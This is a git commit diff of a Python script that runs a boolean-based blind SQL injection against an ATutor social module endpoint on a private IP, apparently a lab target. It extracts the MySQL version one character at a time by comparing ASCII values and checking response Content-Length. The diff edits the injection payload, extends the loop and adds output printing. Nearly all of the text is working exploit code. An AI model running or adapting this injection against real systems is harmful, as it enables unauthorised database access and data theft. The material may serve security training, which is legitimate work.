73f1e3bc93abbdb095545220f52b980f83e51f39
BraysonWheeler <lbw98att@gmail.com>
2023-04-28 19:12:33 -0500

    b

--- bbsqli_mysql_version_extraction.py
+++ bbsqli_mysql_version_extraction.py
@@ -12,16 +12,17 @@ def construct_inj_str(index:int,ascii_rep:int):
         ("asd", 2, 1) returns s
         ("asd", 1, 2) returns as
     """
-    return f"test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),{index},1)))={ascii_rep}%23"
+    return f"test%27)/**/or/**/(ascii(substring((select/**/version()),{index},1)))={ascii_rep}%23"
 
 def main():
     version = ''
-    for i in range(0,10):
+    for i in range(0,19):
         for j in range(32,126): # Printable ASCII Chars are between 33-125
             url = f"http://192.168.206.103/ATutor/mods/_standard/social/index_public.php?q={construct_inj_str(index=i, ascii_rep=j)}"
             response = requests.get(url)
             header_length = int(response.headers['Content-Length'])
             if header_length > 20: # if header_length is > 20 here we found a match
+                print(response.text)
                 version += f"{chr(j)}"
                 break
     if version:
